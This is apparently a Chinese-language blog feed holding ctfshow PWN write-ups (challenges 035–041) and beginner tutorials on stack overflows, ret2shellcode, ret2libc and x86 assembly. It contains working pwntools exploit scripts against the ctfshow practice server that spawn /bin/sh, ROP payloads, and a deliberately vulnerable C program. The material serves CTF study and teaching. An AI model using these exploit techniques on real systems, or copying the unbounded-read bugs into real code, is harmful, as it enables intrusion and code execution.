**\n专用虚拟机镜像，全套在这里，提取码show\nPWN_035\nchecksec一下：\n没开canary保护，对应了本章主题——栈溢出。\nIDA分析：\n跟进函数：\n由此可知：ctfshow函数存在栈溢出漏洞，超过104字节就会发生栈溢出；\n对于SIGSEGV函数，当栈溢出触发 SIGSEGV 时，sigsegv_handler 函数会被调用，然后触发函数内部——fprintf打印出flag字符串，也正好对应了fget函数读取的flag值。\n栈溢出会破坏栈上的 “返回地址”“栈帧信息” 或其他关键内存结构，最终引发非法内存访问（比如函数返回时跳转到无效地址），触发 SIGSEGV 信号。\n所以说我们只要在运行的时候给程序打入超过104个的字符串就好，可以是105个“a”。\n/bin/sh地址的跳转利用 相较于32位程序，64 位程序调用函数需满足 栈对齐，因此构造 payload 时需注意：\n在实际解题中，ret 地址需要针对当前题目动态获取，用 ROPgadget 工具直接搜索程序中的 ret 指令（最常用）：\n1 ROPgadget --binary ./pwn | grep ret PWN_036 题目：存在后门函数，如何利用？ PWN_036\n非常不安全！！！！没有canary保护。可以用ret2shellcode、ret2libc。\n这题开始怪怪的，找不到/bin/sh的后门，sigsegv_handler 函数没有我们想要的flag，不过在左边函数目录看到熟悉的故人——get_flag函数，直接跟进看看：\n可以看到下面的fgets读取和返回的printf(s)打印函数，输出flag字符串，主函数没有引用它啊，怎么办？我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag。（可以用ret2shellcode、ret2libc）\nmain函数的突破点在这：\n没开canary保护，s数组可存储大小范围是36，超过了就覆盖返回地址了。\ngets 读取函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。\n安全性来看一般都会用fgets函数，搭配FORTIFY 缓冲区边界检查来提高程序自身安全性。\nexp：\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * context(arch = \u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;, 28297) elf = ELF(\u0026#39;./pwn\u0026#39;) get_flag_addr = elf.sym[\u0026#39;get_flag\u0026#39;] payload =\u0026#39;A\u0026#39; * 44 + p32(get_flag_addr) io.sendline(payload) #远程发送 io.interactive() #开启shell交互模式（类似终端） 这里的44个‘a’是0x28 + 4 ，0x28（十进制 40）是缓冲区到 ebp（栈基址寄存器）的距离，+4 是覆盖 ebp 本身（32 位程序中寄存器占 4 字节），总共 44 字节后，后续数据才能覆盖函数的 “返回地址”，从而跳转到 get_flag 函数。当然你可以用cyclic(0x28 + 4)，产生44字节的垃圾值。\nPWN_037 题目：32位的 system(“/bin/sh”) 后门函数给你。 PWN_037\nchecksec发现是有无栈溢出保护的，关了canary。\nIDA分析：\n可以发现main函数没有什么可以利用的，但是在函数目录可以看到有个backdoor的函数有猫腻\u0026hellip;.\n这个函数居然有/bin/sh！！！！！\n跟进ctfshow函数：\n有read读取函数，那我们可以以此为注入点，用垃圾值0x12+4先覆盖函数变量和寄存器ebp本身，然后再上传一个后门函数的地址。\nexp：\n1 2 3 4 5 6 7 8 9 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28229) elf = ELF(\u0026#39;./pwn\u0026#39;) backdoor = elf.sym[\u0026#39;backdoor\u0026#39;] #后门函数的地址 payload = cyclic(0x12 + 4) + p32(backdoor) io.sendline(payload) io.recv() io.interactive() 脚本exp万岁。\nPWN_038 题目：64位的 system(“/bin/sh”) 后门函数给你。\nchecksec：\n没开canary保护，开NX保护（不能ret2shellcode）\nbuf数组距离ebp寄存器为0xAh，加上本身寄存器ebp的8字节。\n跟进backdoor函数看到/bin/sh，本题思路和上题PWN_037一样，只不过架构变成64位而已。\n64 位程序调用 system 需考虑堆栈平衡，本质是 64 位 ABI 对 “栈对齐” 的硬性要求—— 若不满足，函数执行时访问栈内存会崩溃；而 32 位 ABI 无此要求，仅需调用后清理参数栈即可，因此无需额外关注平衡。\n所以说exp需要考虑到堆栈平衡加上ret返回地址：\n在实际解题中，ret 地址需要针对当前题目动态获取，常用方法：\n工具查找：用 ROPgadget 工具直接搜索程序中的 ret 指令（最常用）：\n1 ROPgadget --binary ./pwn | grep ret exp：\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * context.log_level = \u0026#39;debug\u0026#39; #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;, 28147) elf = ELF(\u0026#39;./pwn\u0026#39;) backdoor = elf.sym[\u0026#39;backdoor\u0026#39;] ret = 0x400287 # 0x0000000000400287 : ret payload = cyclic(0xA+8) + p64(ret) + p64(backdoor) io.sendline(payload) io.recv() io.interactive() PWN_039 题目：32位的 system(); \u0026ldquo;/bin/sh\u0026rdquo;。 PWN_039\nchecksec一下：\n可以看到没开启canary、PIE保护的，存在可利用栈溢出漏洞的可能。\nIDA：\n跟进ctfshow函数发现栈溢出：\n可以读取50个字符给buf，但buf容量只有14，所以超过14就会造成栈溢出。\n接着在函数目录看到hint函数有猫腻：\n那么大致的exp思路就来了：也就是先cyclic函数生成垃圾值覆盖局部变量和ebp寄存器本身；但是只有system函数和/bin/sh，却没有system(“/bin/sh”);的后门，所以我们只能构造出来。\n在编写exp时，因为程序是32位，所以说不用去考虑它的堆栈平衡：\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * context.log_level = \u0026#39;debug\u0026#39; #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28216) elf = ELF(\u0026#39;./pwn\u0026#39;) system = elf.sym[\u0026#39;system\u0026#39;] bin_sh = 0x8048750 payload = \u0026#39;a\u0026#39;*(0x12+4) + p32(system) + p32(0) + p32(bin_sh) io.sendline(payload) io.recv() io.interactive() 这里的p32(0)等于4字节，可以用四个a或者cyclic(4)代替也行，这时32位下system函数的返回地址占位符，然后就到执行/bin/sh，那就是跳转到它的地址：\n这样子我们就构造出system(\u0026quot;/bin/sh\u0026quot;);了，然后进入交互模式获得flag。\n这题主要考察我们对于函数的构造以及函数地址的拼接、栈的结构组成。需要多看看我的PWN-2啊。。。。\nPWN_040 题目：64位的 system(); \u0026ldquo;/bin/sh\u0026rdquo;。\nIDA64位分析，跟进ctfshow函数：\nchecksec看到未打开canary保护，而且在ctfshow函数这发现有栈溢出。\n跟进hint函数，发现后门。\n用ROPgadget命令查询ret地址：\n1 ROPgadget --binary ./pwn | grep ret 查询/bin/sh的地址：\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * context.log_level = \u0026#39;debug\u0026#39; #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28194) elf = ELF(\u0026#39;./pwn\u0026#39;) system = elf.sym[\u0026#39;system\u0026#39;] bin_sh = 0x400808 pop_rdi = 0x4007e3 # 0x00000000004007e3 : pop rdi ; ret ret = 0x4004fe # 0x00000000004004fe : ret payload = \u0026#39;a\u0026#39;*(0xA+8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system) io.sendline(payload) io.recv() io.interactive() 欸为什么exp的payload中的参数不太一样？\n32位和64位可执行程序的参数传递顺序 即使思路一样但架构不一样，在写payload的时候注入地址的顺序也是不一样的：\n32 位程序（PWN039）：32 位程序中，函数参数通过栈传递。在 PWN039 里，system函数地址紧跟在填充数据之后，这是因为溢出后直接覆盖返回地址为system函数地址，让程序执行system函数。在payload = 'a'*(0x12 + 4) + p32(system) + p32(0) + p32(bin_sh)中，'a'*(0x12 + 4)用于填充缓冲区并覆盖原返回地址，p32(system)将返回地址修改为system函数地址 ，p32(0)是为了满足栈结构，作为system函数执行后的返回地址（实际执行中并不重要，可随意填充 4 字节），p32(bin_sh)则是system函数的参数，即/bin/sh字符串的地址。这样的顺序符合 32 位程序通过栈传参和控制程序执行流的特点。 64 位程序（PWN40）：64 位程序的函数调用规则有所不同，前 6 个参数优先通过寄存器传递，其中第一个参数存放在rdi寄存器。在 PWN40 中，payload = 'a'*(0xA + 8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system) ，'a'*(0xA + 8)用于填充缓冲区和覆盖原返回地址；p64(pop_rdi)将pop_rdi指令地址放入栈中，执行pop_rdi指令时，会把紧跟其后的p64(bin_sh)中的/bin/sh地址弹出到rdi寄存器，作为system函数的第一个参数；p64(ret)用于栈对齐（64 位程序调用函数前需要保证栈 16 字节对齐，ret指令可调整栈指针）；最后p64(system)将system函数地址放入栈中，当程序执行到这里时，会跳转到system函数执行，此时rdi寄存器中已正确设置了参数/bin/sh的地址。 PWN_041 题目：32位的 system(); 但是没\u0026quot;/bin/sh\u0026quot; ，好像有其他的可以替代。 PWN_041\n","date":"2025-08-27T00:00:00Z","image":"https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow_hu_677537c56386674a.png","permalink":"https://expl0rer.top/p/ctfshow-pwn-writeup/","title":"ctfshow-pwn-writeup"},{"content":"前文：以下是我入门PWN的记录，欢迎各位前来观看，小弟领教！\n正在努力加载，敬请期待\u0026hellip;\u0026hellip;\n","date":"2025-08-26T00:00:00Z","image":"https://expl0rer.top/p/pwn-3/PWN3_hu_367ea2043718e6b0.png","permalink":"https://expl0rer.top/p/pwn-3/","title":"PWN-3"},{"content":"前文：以下是我入门PWN的记录，欢迎各位前来观看，小弟领教！\n[TOC]\n继上一大章的基础学习后，对PWN有了一定了解，知道一些专名词、一些保护机制的工作流程、汇编语言等，接下来的几章开始正式学习二进制的漏洞利用和原理。\n栈是PWN比较常见的突破点\n栈溢出原理 在上一大章的函数调用约定中，我们可以了解到函数的调用过程： 调用函数：只需要将rip压栈，即push rip，然后讲rip赋值为被调用函数的起始地址，这一操作被隐性的内置在call指令中。\n被调用函数：push rbp； mov rbp rsp；sub rsp oxxx。即保存调用函数的rbp指针，将自己的rbp指针指向栈顶，然后开辟栈空间给自己用,此时rbp就变成了被调用函数的栈底。\n函数返回：leave；ret；翻译过来就是：mov rsp rbp；pop rbp；pop rip；即恢复栈帧，返回调用函数的返回地址。\n栈的作用为存储函数调用相关信息以及函数的局部变量。\n这些局部变量通常为数组或者输入的缓冲区（buf）。而函数调用相关的信息，主要是返回地址和栈底指针（rbp）。\n栈溢出 函数中的存储在找中的局部变量数组边界检查不严格发生越界写，造成用户输入覆盖到缓冲区外的数据内容。\n由于栈中同时存在着与函数调用参数的相关信息，栈溢出可以导致控制流劫持。\n来让我解释一下：\n若用户输入长度超过数组容量，超出的部分会向上覆盖栈中更高地址的数据（因为栈向下生长，越界写会向高地址蔓延）； 当覆盖到 “返回地址” 时，攻击者可以将其修改为任意地址（如 shellcode 地址、ROP gadget 地址等）； 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include \u0026lt;unistd.h\u0026gt; // 包含read函数声明 // 存在漏洞的函数：读取200字节到80字节的缓冲区 void func_a() { char buf[80]; // 局部变量：80字节的数组 read(0, buf, 200); // 从标准输入读取200字节到buf（无长度检查，必然溢出） return; } // 调用func_a的函数 void func_b() { func_a(); // 调用漏洞函数 int c; // 局部变量c c = 1; // 给c赋值 return; } // 主函数 int main() { func_b(); // 调用func_b int a; // 局部变量a a = 2; // 给a赋值 return 0; } main函数调用b，b函数调用a。缓冲区溢出发生在a函数中。\nbuf的长度为80，但是却读入了200长度。（栈溢出）\n分析程序运行至a时的栈帧、栈中存放buf和返回地址等等信息： 输入200长度造成栈溢出，超出的 120 字节会向上覆盖栈中更高地址的内容如ret（因为栈向下生长，越界写会向高地址蔓延）。\n覆盖返回地址可以控制程序下一步执行的位置，而通过控制执行位置，攻击者可以间接实现 “修改任意地址” 的效果。\n举例，攻击者构造输入：前 84 字节填充无关数据（覆盖buf和func_b()的 ebp），第 85~88 字节填入0x12345678（小端序可能需要反写为0x78563412）；这时返回地址被覆盖成0x12345678，直接跳转到0x12345678（可能是攻击者的代码）。\n那说起返回地址这一块，回忆一下：\n调用函数：只需要将rip压栈，即push rip，然后讲rip赋值为被调用函数的起始地址，这一操作被隐性的内置在call指令中。\n被调用函数：push rbp；mov rbp rsp; sub rsp oxxxx。即保存调用函数的rbp指针，将自己的rbp指针指向栈顶，然后开辟栈空间给自己用，此时rbp就 变成了被调用函数的栈底。\n函数返回：leave；ret；翻译过来就是：mov rsp rbp；pop rbp；pop rip；即恢复栈帧，返回调用函数的返回地址。\n栈溢出的核心是覆盖程序中 “会被用来决定下一步执行位置” 的数据，这些数据未必是ret指令读取的 “返回地址”。如果栈中存在被jmp、call等指令使用的 “目标地址”（比如函数指针、跳转表项等），覆盖这些地址同样能实现控制流劫持。\n具体来说：ret、jmp、call的共性与差异：\nret指令：从栈中读取 “返回地址” 并跳转（依赖栈中存储的地址） call 地址指令：将当前指令的下一条地址压栈，然后跳转到 “地址”（若 “地址” 存储在栈中且可被覆盖，则call的目标会被篡改） jmp 地址指令：直接跳转到 “地址”（若 “地址” 存储在栈中且可被覆盖，则jmp的目标会被篡改） 只要这些指令依赖的 “目标地址” 存储在栈中，且能被栈溢出覆盖，就能劫持控制流。ret只是最常见的场景（因为函数调用的返回地址几乎必然在栈上），而jmp/call的目标若在栈上，同样可以被利用。\n总之：栈溢出的原理就是栈中存储的局部变量数组发生溢出，覆盖了栈中的其他数据。将返回地址覆盖为我们期望的目标地址，即可劫持控制流。\n栈溢出在CTF中的应用 一般来说，在CTF中的PWN，多数情况下我们需要让程序执行这一段代码： system(\u0026quot;/bin/sh\u0026quot;)\n也就是说在远程机器上开一个命令行终端，这样我们就可以通过命令行来控制目标机器。\n通常来说，CTF比赛中只需要开启命令行后读flag(cat flag）。\n基本栈溢出 如果程序中没有system这样的代码出现，怎么办？我们可以自己写shellcode！\n**shellcode**就是一段可以独立开启shell的一段汇编代码。\nret2shellcode的思路就是：\n如果程序中存在让用户向一段长度足够的缓冲区中输入数据。我们向其中输入shellcode，将程序劫持到shellcode上即可。当然，这种也是理想情况。\nret2shellcode是二进制漏：洞利用中的一种常见技术，用于在存在栈溢出等漏洞的程序中获取系统的 shell 权限，从而执行任意命令。ret2shellcode利用这个特性，将返回地址覆盖为一段精心构造的机器码（即 shellcode）的地址，从而返回到攻击者留下的shellcode进行劫持。\n栈溢出案例：ret2shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include \u0026#34;stdlib.h\u0026#34; #include \u0026#34;stdio.h\u0026#34; #incldue \u0026#34;unistd.h\u0026#34; char global_buf[200]; void gen_shell() { execv(\u0026#34;/bin/sh\u0026#34;,0); puts(\u0026#34;wow\u0026#34;); return ; } void vul() { char buf[80]; write(1,\u0026#34;input:\u0026#34;,6); read(0,buf,200); puts(\u0026#34;done\\n\u0026#34;); return ; } int main() { mpritect(0x404000,1000,7); setvbuf(stdout,0,2,0); setvbuf(stdin,0,1,0); printf(\u0026#34;gen_shell:0x%x\\n\u0026#34;,(unsigned)\u0026amp;gen_shell); printf(\u0026#34;global_buf:0x%x\\n\u0026#34;,(unsigned)\u0026amp;global_buf); write(1,\u0026#34;global:\u0026#34;,7); read(0,global_buf,200); vul(); puts(\u0026#34;goodbye!\u0026#34;); return 0; } vul函数存在明显的栈溢出，可以劫持控制流到gen_shell函数、可以劫持控制流到global_buf。\n局部变量buf[80]仅分配 80 字节，但read(0, buf, 200)读取 200 字节输入，超出的 120 字节会覆盖栈中更高地址的数据（包括ebp和返回地址），属于典型的栈溢出漏洞。\n方法一：生成payload脚本劫持 vul()函数中，buf[80]是局部变量，栈布局从低到高为：buf[0..79] → ebp（4 字节，32 位系统） → 返回地址（4 字节）。\n覆盖返回地址需要先填充：80字节（buf） + 4字节（覆盖ebp），之后的 4 字节就是要写入的返回地址（即gen_shell的地址）。\n构造攻击数据（以 Python 为例）：\n1 2 3 # 假设gen_shell地址为0x401120，小端序为b\u0026#39;\\x20\\x11\\x40\\x00\u0026#39; payload = b\u0026#39;A\u0026#39;*80 + b\u0026#39;B\u0026#39;*4 + b\u0026#39;\\x20\\x11\\x40\\x00\u0026#39; print(payload) # 输出到程序输入 输入攻击数据后，vul()函数执行return时，返回地址已被覆盖为0x401120，程序会跳转到gen_shell函数，执行execv(\u0026quot;/bin/sh\u0026quot;, 0)，成功获取 shell。\n方法二：利用栈溢出跳转到shellcode 构造 payload 覆盖 vul() 函数的返回地址为 global_buf 的地址（即 shellcode 所在位置）\u0026hellip;\u0026hellip;\nret2libc 有时候，我们需要调用一些系统函数，就比如说system或者execv等。程序中可能不会提供一些现成的函数。\n如果我们拿到了libc中函数的地址，我们可以直接调用libc中的函数，只需要传递好参数，然后call即可。\n如何传参？如何调用system(/bin/sh)？\n只需要将rdi设置为/bin/sh字符串地址，然后call system即可。\n如何设置mov？\n如果直接mov，然后call，那么就和ret2shellcode无异。\n现在问题是，我们只有一个libc地址和/bin/sh字符串地址，以及一个栈溢出漏洞，怎么传递参数？\npop rdi ret + /bin/sh地址 + system\n来个例子：有一个存在栈溢出的 64 位程序 vuln\n有一个漏洞函数 vul()，存在栈溢出（可覆盖返回地址）；\n程序加载了 libc 库（必然包含 system 函数）；\n我们通过信息泄露已经获取到：\nsystem 函数在内存中的地址：0x7ffff7839410 \u0026quot;/bin/sh\u0026quot; 字符串在内存中的地址：0x7ffff79e5aaa 一个 pop rdi; ret gadget 的地址：0x401273（从程序中找到） 经调试，覆盖 vul() 函数返回地址需要先填充 120 字节（前 120 字节会覆盖局部变量和 rbp）。\n函数的第一个参数通过 rdi 寄存器传递。因此调用 system(\u0026quot;/bin/sh\u0026quot;) 必须满足：\nrdi 寄存器中存放 \u0026quot;/bin/sh\u0026quot; 字符串的地址（0x7ffff79e5aaa）；\n程序跳转到 system 函数的地址（0x7ffff7839410）执行。\n通过栈溢出构造 payload，最终让程序执行 system(\u0026quot;/bin/sh\u0026quot;)，获取 shell。\n用 Python 代码生成 payload（pwntools）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from pwn import * # 构造 payload offset = 120 # 覆盖到返回地址的偏移量 pop_rdi_ret = 0x401273 # pop rdi; ret gadget 地址 bin_sh_addr = 0x7ffff79e5aaa # \u0026#34;/bin/sh\u0026#34; 地址 system_addr = 0x7ffff7839410 # system 函数地址 payload = ( b\u0026#39;A\u0026#39; * offset # 填充偏移 + p64(pop_rdi_ret) # 放入 gadget 地址 + p64(bin_sh_addr) # 放入参数地址（给 rdi） + p64(system_addr) # 放入 system 地址（跳转执行） ) # 发送 payload 到程序（假设通过管道连接） p = process(\u0026#39;./vuln\u0026#39;) p.sendline(payload) p.interactive() # 交互获取 shell ret2libc 调用 system(\u0026quot;/bin/sh\u0026quot;) 的核心逻辑是：\n用 pop rdi; ret 把栈中的 \u0026quot;/bin/sh\u0026quot; 地址 “搬” 到 rdi 寄存器，再跳转到 system 函数。\n整个过程完全依赖栈溢出控制程序执行顺序，不需要程序中存在现成的 shell 函数，也不需要栈可执行，因此适用性极强。\n在这里开始就需要刷点PWN题了，我比较推荐的是ctfshow，购买官网套餐或者去咸鱼上买网盘保存的ctfshow-pwn题也行，看自己预算，在这里我就会同步进行writeup_pwn的编写了。\nROP ","date":"2025-08-25T00:00:00Z","image":"https://expl0rer.top/p/pwn-2/PWN2_hu_2d4ab7854696bd7b.png","permalink":"https://expl0rer.top/p/pwn-2/","title":"PWN-2"},{"content":"[TOC]\n前文：以下是我入门PWN的记录，欢迎各位前来观看，小弟领教！\nCTF是什么？ CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式。\nCTF比赛形式主要为线上解题（jeopardy）和线下攻防（Attack With Defence）\n线上赛题目大致方向有WEB、RE、PWN、MISC、CRYPTO，解出flag交给服务器验证通过才得分。\nPWN简介 Pwn是什么？\n\u0026ldquo;Pwn\u0026quot;是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音一研的一声，被“黑”的电脑或手机就被你操纵了。CTF中的PWN主要是针对于二进制漏洞挖掘与利用，通常情况下选手需要对于一个有漏洞的可执行文件进行分析，找到漏洞，然后利用漏洞读取远程服务器上的FLAG。\nPwn传统出题方向：glibc PWN：堆、栈、shellcode编写、iofile等。进阶：arm架构、loT、内核、vm、浏览器等。\n所需工具：pwntools、pwndbg、IDA、虚拟机（Ubuntu或Kali）\n实际生活中我们会遇到的pwn：\n泄露通信数据：心脏滴血（cve-2014-0160）\nLinux本地提权root：脏牛dirty cow（cve-2016-5195）\nWannacry：永恒之蓝勒索病毒\nPWN入门劝退集\u0026hellip;\u0026hellip;\n汇编语言基础 我自己在打ctf逆向和pwn，也时常搞不懂bit和byte，在这里我先把一些计算机内的量词回忆一下：\n名称 翻译 大小 bit 比特 1位（1b） byte 字节 8位（1B） word 字 16位 dword 双字 32位 qword 四字 64位 计算机寻址方式\n在当前主流的操作系统中，都是以字节（B）为寻址单位进行寻址。\n意味着计算机访问的最小单位是一个字节（B）。\n类比于人口普查，普查员以每户（B)为单位统计，而不是访问到个人（b）。\n寄存器 计算机的指令都是由CPU来执行。\n在计算机系统结构中，CPU和内存是分开的。\n寄存器存在于CPU中，是CPU的直接操作对象。\n寄存器名称 作用 备注 RAX 通用寄存器 低32位：EAX；低16位：AX；低8位：AL RBX 通用寄存器 低32位：EAX；低16位：AX；低8位：AL RCX 通用寄存器 低32位：EAX；低16位：AX；低8位：AL RDX 通用寄存器 低32位：EAX；低16位：AX；低8位：AL RDI 通用寄存器 低32位：EDI RSI 通用寄存器 低32位：EDI R8 通用寄存器 低32位：EDI R9 通用寄存器 低32位：EDI R10 通用寄存器 低32位：EDI R11 通用寄存器 低32位：EDI R12 通用寄存器 低32位：EDI R13 通用寄存器 低32位：EDI R14 通用寄存器 低32位：EDI R15 通用寄存器 低32位：EDI RSP 栈顶指针 低32位：ESP RBP 栈底指针 低32位：ESP EFLAGS 标志寄存器 记录标志状态，包括AF、PF、SF、ZF、OF、CF等标识位 RIP 指令计数器 保存下一条将会执行的指令的地址 上述的通用寄存器，通常用于参数传递以及算数运算等通用场合。\nRSP为栈顶指针，RBP为栈底指针，二者用于维护程序运行时的函数栈，在之后的调用约定一节会对其进行讲解。\nEFLAGS为标志位寄存器，用于存储CPU运行计算过程中的状态，如进位溢出等。\nRIP指针用于存储CPU下一条将会执行的指针，不能直接修改,正常情况下会每一次运行一条指令自增一条指令的长度，当发生跳转时才会以其他形式改变其值。\nCPU的寻址方式 学过C语言都知道指针，它是一个变量，它存储的是另一个变量的内存地址，而不是直接存储数据本身。这里解释的是比较含糊，详细的还请搜索引擎。\n寻址方式 示例 实际访问 立即寻址 1234h 1234h这个数字本身 直接寻址 [1234h] 内存地址1234h 寄存器寻址 RAX 访问RAX寄存器 寄存器间接寻址 [RAX] 访问RAX寄存器存储的值的这一内存地址 变址寻址 [RAX+1234h] 访问RAX寄存器存储的值+1234h这一内存地址 汇编指令 指令类型 操作码 例子（Intel格式） 实际效果 数据传送指令 mov mov rax rbx rax = rbx 取地址指令 lea lex rax [rbx] rax =\u0026amp;*rbx 算数运算指令+ add add rax rbx rax = rax + rbx - sub sub rax rbx rax = rax - rbx 逻辑运算指令 and and rax rbx rax = rax\u0026amp;rbx xor xor rax rbx rax = rax | rbx 函数调用指令 call call 1234h 执行内存地址1234h处的函数 函数返回指令 ret ret 函数返回 比较 cmp cmp rax rbx 比较rax与rbx，结果保存在EFLAG寄存器 无条件跳转 jmp jmp 1234h eip = 1234h 栈操作指令 push push rax 将rax存储的值压栈 pop pop rax 将栈顶的值赋值给rax，rsp+=8 不难发现两个操作数指令的目的寄存器都是第一个寄存器，刚开始看的话有些奇怪。\n细心的同学可能会注意到call和jmp指令看起来效果都一样，但是描述却有些不同，call的话是函数调用，需要一些函数地址的保存压栈参数传递的操作，而jmp指令类似于C、Python语言的函数中的if、else语句，只涉及跳转，不能作为函数调用来使用。\n另外在pop时rsp为何是+8而不是-8。\n上述问题留到之后的调用约定中讲解\u0026hellip;\u0026hellip;\n了解到上述汇编语言后，感觉生词特别多，这对我感觉也是，不过我建议还是学过C语言和有一点入门Python之后再去看汇编语言，不然会很坐牢的，因为：\n计算机在执行汇编代码时，只会顺序执行。\n通过call、jmp、ret这种指令来完成跳转，所以汇编指令代码的执行流并不像高级语言程序一样流程明确。（在学习了C语言的指针这块的知识点，这会让你学汇编比较有利的）\n汇编指令代码会经常跳转导致可读性差一些，但执行效果是和高级语言（C、Python语言）差不多的。\n给点表格太懵了，我列出些例子(assembly\u0026ndash;C)来看看：\n1 2 3 4 5 6 7 8 9 10 11 mov rax 0 ;int a = 0 label1 ;标签1，标签标志作用，用于标记代码中的某个位置，方便程序跳转或引用，标签本身不执行任何操作，仅作为一个 “标记点”，配合跳转指令jmp、jne（例如C中的goto作用），实现程序流程的控制 inc rax ;a++、a = a + 1 loop ;循环体的跳转 cmp rax 100 ;比较rax和100 jge label2 ;if a\u0026gt;= 100, break；这里就是a大于或等于100，就跳转到label2标签下的函数，否则就是小于100（jmp）跳转到label1下。 jmp label1 ;loop label2 ;标签2 mov rax 0 ;将寄存器rax的值设置为0,清零返回（return 0） 不难发现，汇编语言的类似条件语句的jmp、jge不像if、else那样会有个比较符号（\u0026gt;=、\u0026lt;、!=、==）这样明显区分的，而是jge默认有条件跳转——大于等于\u0026gt;=则跳转，jmp则是强制跳转（而不是小于\u0026lt;就跳转），这点需要记住咯。\n这里的jge是通过eflag寄存器中的标志位来判断的，而eflag的标志位是通过之前的cmp来设置的。\nloop的情况稍些复杂，这里单独为其解释下：\n1 2 3 4 5 6 7 8 9 10 mov rcx, 5 ; 设置循环次数为 5（rcx 作为计数器） label_loop: ; 循环体开始标签 ; 循环执行的操作（例如打印、计算等） mov rax, 1 add rax, 2 loop label_loop ; 计数器 rcx 减 1，若不为 0 则跳回 label_loop ; 循环结束后执行这里的代码 mov rbx, 0 ;return 0 loop自带a- -、a =a -1的作用，所以rcx=5的话，那就循环执行5次，rcx=0就退出循环。\n好难啊，要长脑子了\u0026hellip;\u0026hellip;\n还是用C语言开开路吧：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #include \u0026lt;stdint.h\u0026gt; int main() { uint64_t rcx = 5; // 循环计数器初始值为5 uint64_t rax; //定义rax、rbx、rcx uint64_t rbx; // for循环模拟loop指令：先判断计数器，不为0则执行循环体 for (; rcx \u0026gt; 0; rcx--) { rax = 1; // 对应 mov rax, 1 rax += 2; // 对应 add rax, 2 } rbx = 0; // 循环结束后设置rbx为0；rbx其实在C语言中是没有用的，在汇编语言中就充当类似return 0的作用 return 0; } 数值上下限/溢出 计算机不能存储无限大的数，这个数的数值有一定上限和下限。在这里了解下就好，学C语言都知道的。\n类型 存储空间大小 最小值（一一对应） 最大值（一一对应） char 1个字节 -128 或 0 127 或 255 unsigned char 1个字节 0 255 signed char 1个字节 -128 127 int 2个或4个字节 -32 768 或 -2 147 483 648 32767 或 2 147 483 647 unsigned int 2个或4个字节 0 65535或4 294 967 295 short 2个字节 -32 768 32767 unsigned short 2个字节 0 65 535 long 4个字节 -2 147 483 648 4 294 967 295 unsigned long 4个字节 0 4 294 967 295 long long (C99) 8个字节 -9 223 372 036 854 775 808 9 223 372 036 854 775 807 unsigned long long 8个字节 0 18 446 744 073 709 551 615 如果是unsigned 也就是无符号数，数据的每一位都是代表数据。如果是signed有符号数，那么数据的最高位会被当作符号位处理。0代表正数,1代表负数。\n溢出（这些比较有辨识度，看到就知道是溢出就好）\n数值有上下限范围，那么就不可避免的会有溢出情况。以32位int为例，有以下四种溢出：\n无符号上溢：0xffffffff + 1变成0\n无符号下溢：0-1变成0xffffffff\n有符号上溢：有符号正数0x7fffffff +1 变成负数0x80000000\n无符号下溢：有符号数0x80000000 -1 变成正数0x7fffffff\n这就是整数溢出。通常来说原因就是两点：\n存储位数不够\n溢出到符号位\n整数溢出一般配合别的漏洞来使用。\n汇编小结 汇编语言贯穿PWN、Reverse（逆向）的，比较重要。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 ; 立即寻址方式 mov eax, 11 ; 将11赋值给eax add eax, 114504 ; eax加上114504 sub eax, 1 ; eax减去1 ; 寄存器寻址方式 mov ebx, 0x36d ; 将0x36d赋值给ebx mov edx, ebx ; 将ebx的值赋值给edx ; 直接寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx ; 寄存器间接寻址方式 mov esi, msg ; 将msg的地址赋值给esi mov eax, [esi] ; 将esi所指向的地址的值赋值给eax ; 寄存器相对寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx add ecx, 4 ; 将ecx加上4 mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax ; 基址变址寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx mov edx, 2 ; 将2赋值给edx mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax ; 相对基址变址寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx mov edx, 1 ; 将1赋值给edx add ecx, 8 ; 将ecx加上8 mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax ; 输出字符串 mov eax, 4 ; 系统调用号4代表输出字符串 mov ebx, 1 ; 文件描述符1代表标准输出 mov ecx, msg ; 要输出的字符串的地址 mov 